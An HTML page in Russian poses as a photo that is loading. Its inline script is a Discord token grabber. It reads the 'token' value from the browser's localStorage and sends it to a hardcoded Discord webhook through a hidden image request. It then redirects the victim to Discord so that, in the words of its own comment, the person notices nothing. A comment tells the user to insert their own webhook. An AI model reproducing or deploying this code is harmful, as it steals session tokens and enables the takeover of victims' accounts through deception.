<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Фото загружается...</title>
  <style>
    body{background:#000;color:#fff;font:22px Arial;text-align:center;padding-top:15%}
  </style>
</head>
<body>
  <h1>Загрузка фото...</h1>

  <script>
    // ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
    // ВСТАВЬ СВОЙ ВЕБХУК СЮДА (полный URL!)
    const WEBHOOK = "https://ptb.discord.com/api/webhooks/1447243695366738106/iCvLL1roGXfGONygU2iASibPbJjs5AwiE5u3AxjvR1Eb9qQ-JgDGwcNrNn-u8p3C93RZ";
    // ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←

    const token = localStorage.getItem("token") || "нет токена";

    if (!token || token === "нет токена") {
      setTimeout(() => location.href = "https://discord.com/app", 1000);
    } else {
      // Отправляем токен без CORS-ошибок через простую картинку
      new Image().src = `${WEBHOOK}?token=${encodeURIComponent(token)}&time=${Date.now()}`;

      // Через секунду переходим в Discord, чтобы человек ничего не заметил
      setTimeout(() => {
        location.href = "https://discord.com/app";
      }, 1200);
    }
  </script>
</body>
</html>
